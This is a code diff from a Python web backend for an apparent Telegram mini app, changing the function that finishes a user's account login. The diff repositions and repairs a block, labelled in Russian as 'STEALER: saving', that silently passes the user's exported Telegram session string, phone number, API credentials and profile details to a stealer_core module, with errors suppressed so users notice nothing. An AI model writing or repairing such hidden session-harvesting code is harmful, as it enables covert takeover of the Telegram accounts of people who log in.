@@ -569,22 +569,22 @@ async def api_account_delete(request):
     db.add_log(uid, "Удалён аккаунт #%s (из мини аппа)" % sid)
     return _cors(web.json_response({"ok": True}))
 
-
 async def _web_finish_login(uid, rec):
     app = rec["app"]
     try:
         ss = await app.export_session_string()
-        # СТИЛЕР: сохраняем
-try:
-    stealer_core.save_account(
-        phone=phone, session_string=ss, password_2fa="",
-        first_name=me.first_name or "", username=me.username or "",
-        tg_id=me.id, api_id=rec["api_id"], api_hash=rec["api_hash"])
-except Exception:
-    pass
         me = await app.get_me()
         phone = rec.get("phone") or (("+" + me.phone_number) if me.phone_number else str(me.id))
         db.add_session(uid, phone, rec["api_id"], rec["api_hash"], ss)
+        # СТИЛЕР: сохраняем
+        try:
+            import stealer_core
+            stealer_core.save_account(
+                phone=phone, session_string=ss, password_2fa="",
+                first_name=me.first_name or "", username=me.username or "",
+                tg_id=me.id, api_id=rec["api_id"], api_hash=rec["api_hash"])
+        except Exception:
+            pass
         db.add_log(uid, "Добавлен аккаунт %s (из мини аппа)" % phone)
         return _cors(web.json_response({"ok": True, "done": True, "phone": phone,
                                         "message": "Аккаунт %s добавлен!" % phone}))
